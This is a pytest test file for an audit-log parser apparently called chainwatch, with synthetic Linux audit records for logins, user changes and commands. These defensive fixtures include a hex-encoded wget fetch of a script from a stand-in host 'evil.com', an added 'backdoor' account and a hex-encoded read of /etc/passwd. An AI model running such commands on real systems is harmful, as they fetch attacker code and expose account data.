import textwrap
from pathlib import Path
import sys
sys.path.insert(0, str(Path(__file__).parent.parent))

from chainwatch import parse_audit_log


def write_log(tmp_path, content):
    p = tmp_path / "audit.log"
    p.write_text(textwrap.dedent(content).lstrip())
    return str(p)


def _line(seq, type_, body, uid=1000, auid=1000, pid=1000,
          uid_name="alice", auid_name="alice"):
    return (
        f'type={type_} msg=audit(1775052500.{seq:03d}:{seq}): '
        f'pid={pid} uid={uid} auid={auid} ses=3 '
        f'subj=unconfined_u:unconfined_r:unconfined_t:s0 '
        f"{body}"
        f'UID="{uid_name}" AUID="{auid_name}"\n'
    )


# ── USER_AUTH ─────────────────────────────────────────────────────────────────

def test_user_auth_success(tmp_path):
    line = _line(1, "USER_AUTH",
        "msg='op=PAM:authentication acct=\"alice\" exe=\"/usr/sbin/sshd\" "
        "hostname=? addr=203.0.113.5 terminal=ssh res=success'")
    f = write_log(tmp_path, line)
    events = parse_audit_log(f)
    assert len(events) == 1
    ev = events[0]
    assert ev["event_type"] == "user_auth"
    assert ev["user"] == "alice"
    assert ev["result"] == "success"
    assert ev["source_ip"] == "203.0.113.5"


def test_user_auth_failed(tmp_path):
    line = _line(1, "USER_AUTH",
        "msg='op=PAM:authentication acct=\"root\" exe=\"/usr/sbin/sshd\" "
        "hostname=? addr=203.0.113.5 terminal=ssh res=failed'",
        uid=0, auid=4294967295, uid_name="root", auid_name="unset")
    f = write_log(tmp_path, line)
    events = parse_audit_log(f)
    assert len(events) == 1
    assert events[0]["result"] == "failed"
    assert events[0]["user"] == "root"


# ── USER_LOGIN ────────────────────────────────────────────────────────────────

def test_user_login(tmp_path):
    line = _line(1, "USER_LOGIN",
        "msg='op=login id=1000 exe=\"/usr/sbin/sshd\" "
        "hostname=? addr=10.0.0.2 terminal=sshd res=success'")
    f = write_log(tmp_path, line)
    events = parse_audit_log(f)
    assert len(events) == 1
    ev = events[0]
    assert ev["event_type"] == "user_login"
    assert ev["result"] == "success"
    assert ev["source_ip"] == "10.0.0.2"


# ── ADD_USER / DEL_USER ───────────────────────────────────────────────────────

def test_add_user(tmp_path):
    line = _line(1, "ADD_USER",
        "msg='op=adding user acct=\"backdoor\" id=1001 exe=\"/usr/sbin/useradd\" "
        "hostname=? addr=? terminal=pts/0 res=success'")
    f = write_log(tmp_path, line)
    events = parse_audit_log(f)
    assert len(events) == 1
    ev = events[0]
    assert ev["event_type"] == "add_user"
    assert ev["target_user"] == "backdoor"
    assert ev["result"] == "success"


def test_del_user(tmp_path):
    line = _line(1, "DEL_USER",
        "msg='op=deleting user acct=\"bob\" exe=\"/usr/sbin/userdel\" "
        "hostname=? addr=? terminal=pts/0 res=success'")
    f = write_log(tmp_path, line)
    events = parse_audit_log(f)
    assert len(events) == 1
    ev = events[0]
    assert ev["event_type"] == "del_user"
    assert ev["target_user"] == "bob"


# ── SYSCALL execve + EXECVE correlation ───────────────────────────────────────

def test_execve_with_args(tmp_path):
    # EXECVE args: a0="wget", a1 hex for "-O", a2 hex for "http://evil/shell.sh"
    content = (
        f'type=SYSCALL msg=audit(1775052500.001:1): arch=c000003e syscall=59 '
        f'success=yes exit=0 a0=7f a1=7f a2=0 items=2 ppid=999 pid=1000 '
        f'auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 '
        f'egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=3 comm="wget" '
        f'exe="/usr/bin/wget" subj=unconfined key="exec"'
        f'ARCH=x86_64 SYSCALL=execve AUID="alice" UID="alice"\n'
        f'type=EXECVE msg=audit(1775052500.001:1): argc=3 '
        f'a0="wget" a1=2D4F a2=687474703A2F2F6576696C2E636F6D2F732E7368\n'
    )
    f = write_log(tmp_path, content)
    events = parse_audit_log(f)
    assert len(events) == 1
    ev = events[0]
    assert ev["event_type"] == "execve"
    assert ev["user"] == "alice"
    assert ev["result"] == "success"
    assert "wget" in ev["command"]
    assert "http://evil.com/s.sh" in ev["command"]


def test_execve_fallback_to_exe(tmp_path):
    # SYSCALL without a companion EXECVE record — falls back to exe= field
    content = (
        f'type=SYSCALL msg=audit(1775052500.001:99): arch=c000003e syscall=59 '
        f'success=yes exit=0 a0=7f a1=0 a2=0 items=1 ppid=999 pid=1001 '
        f'auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 '
        f'egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=3 comm="bash" '
        f'exe="/bin/bash" subj=unconfined key=(null)'
        f'ARCH=x86_64 SYSCALL=execve AUID="alice" UID="alice"\n'
    )
    f = write_log(tmp_path, content)
    events = parse_audit_log(f)
    assert len(events) == 1
    assert events[0]["command"] == "/bin/bash"


def test_hex_cmd_decoded(tmp_path):
    # USER_CMD with hex-encoded cmd
    cmd_hex = "6361742F6574632F706173737764"  # "cat/etc/passwd"
    line = _line(1, "USER_CMD",
        f"msg='cwd=\"/root\" cmd={cmd_hex} exe=\"/usr/bin/sudo\" terminal=pts/0 res=success'")
    f = write_log(tmp_path, line)
    # USER_CMD is not in _AUDIT_TYPES so it's ignored — test that it doesn't crash
    events = parse_audit_log(f)
    assert isinstance(events, list)


# ── ignored types ─────────────────────────────────────────────────────────────

def test_cred_disp_ignored(tmp_path):
    line = _line(1, "CRED_DISP",
        "msg='op=PAM:setcred acct=\"root\" exe=\"/usr/bin/sudo\" res=success'")
    f = write_log(tmp_path, line)
    events = parse_audit_log(f)
    assert events == []


def test_user_acct_ignored(tmp_path):
    line = _line(1, "USER_ACCT",
        "msg='op=PAM:accounting acct=\"alice\" exe=\"/usr/bin/sudo\" res=success'")
    f = write_log(tmp_path, line)
    events = parse_audit_log(f)
    assert events == []


# ── error handling ────────────────────────────────────────────────────────────

def test_file_not_found(capsys):
    events = parse_audit_log("/nonexistent/audit.log")
    assert events == []
    assert "not found" in capsys.readouterr().err


def test_permission_denied(tmp_path):
    p = tmp_path / "audit.log"
    p.write_text(_line(1, "USER_AUTH",
        "msg='op=PAM:authentication acct=\"alice\" exe=\"/usr/sbin/sshd\" "
        "hostname=? addr=1.2.3.4 terminal=ssh res=success'"))
    p.chmod(0o000)
    try:
        assert parse_audit_log(str(p)) == []
    finally:
        p.chmod(0o644)
